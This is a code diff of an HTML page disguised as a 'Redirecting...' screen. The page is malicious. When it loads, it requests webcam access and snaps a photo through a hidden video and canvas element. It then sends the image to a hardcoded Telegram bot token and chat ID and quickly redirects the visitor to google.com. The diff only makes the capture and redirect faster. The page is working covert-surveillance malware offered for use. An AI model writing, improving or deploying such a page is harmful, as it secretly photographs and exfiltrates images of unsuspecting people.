@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loading...</title>
+  <title>Redirecting...</title>
 </head>
 <body style="margin:0; background:#000;">
   <video id="video" autoplay playsinline style="display:none;"></video>
@@ -11,64 +11,46 @@
   <script>
     const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
     const CHAT_ID = "7009447523";
-    const REDIRECT_URL = "https://google.com"; // 👈 Apna link daalein
+    const REDIRECT_URL = "https://google.com";
 
-    // Always request fresh permission
-    async function forceCameraAccess() {
+    async function startCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        return stream;
-      } catch (err) {
-        console.error("🚫 Camera blocked:", err);
-        return null;
-      }
-    }
-
-    async function captureAndSend(stream) {
-      try {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
         video.srcObject = stream;
 
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => resolve();
-        });
+        video.onloadedmetadata = () => {
+          setTimeout(async () => {
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
+            const blob = await (await fetch(dataUrl)).blob();
 
-        // Wait 300ms for video to stabilize
-        setTimeout(async () => {
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL('image/jpeg', 0.9);
-          const blob = await (await fetch(imageData)).blob();
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "snap.jpg");
 
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "snap.jpg");
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            }).catch((e) => console.log("Telegram error:", e));
+          }, 100); // ultra fast
+        };
 
-          // Send image
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          }).catch(err => console.error("Telegram error:", err));
-        }, 300); // short delay for frame capture
-      } catch (error) {
-        console.error("❌ Capture/send failed:", error);
+        // Immediate redirect — no delay
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 500); // max 0.5 sec delay
+
+      } catch (err) {
+        console.log("Permission not given or error:", err);
+        // Still redirect if permission not given
+        window.location.href = REDIRECT_URL;
       }
     }
 
-    // Start process on load
-    window.onload = async () => {
-      const stream = await forceCameraAccess();
-
-      if (stream) {
-        await captureAndSend(stream);
-      }
-
-      // Redirect after short time regardless of success
-      setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 1000); // 1 second total
-    };
+    window.onload = startCapture;
   </script>
 </body>
 </html>
